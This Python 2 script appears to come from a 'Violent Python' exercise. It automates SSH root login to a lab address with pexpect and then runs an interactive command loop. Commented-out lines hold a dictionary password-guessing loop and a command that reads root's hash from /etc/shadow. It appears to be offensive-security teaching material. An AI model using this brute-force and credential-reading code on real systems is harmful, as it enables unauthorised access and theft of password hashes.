import pexpect
PROMPT = ['# ', '>>> ', '> ', '\$ ']


def send_command(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(user, host, password):
    ssh_newkey = 'Are you sure you want to continue connecting'
    connStr = 'ssh ' + user + '@' + host
    child = pexpect.spawn(connStr)
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey,
                        '[P|p]assword:[| ]'])
    if ret == 0:
        print(' [-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:[| ]'])
        if ret == 0:
            print(' [-] Error Connecting')
            return
    child.sendline(password)
    child.expect(PROMPT)
    return child


def main():
    host = '192.168.56.103'
    user = 'root'
    password = 'password'
    '''f = open('/root/ViolentPython/Chapter1/add_files/dictionary.txt', 'r')
    for password in f.readlines():
        try:
            child = connect(user, host, password)
        except Exception, e:
            print e'''
    child = connect(user, host, password)
    #send_command(child, 'cat /etc/shadow | grep root')
    cmd = 0
    while (True) | (cmd == None):
        cmd = raw_input(user + '@' + host + '# ')
        send_command(child, cmd)


if __name__ == '__main__':
    main()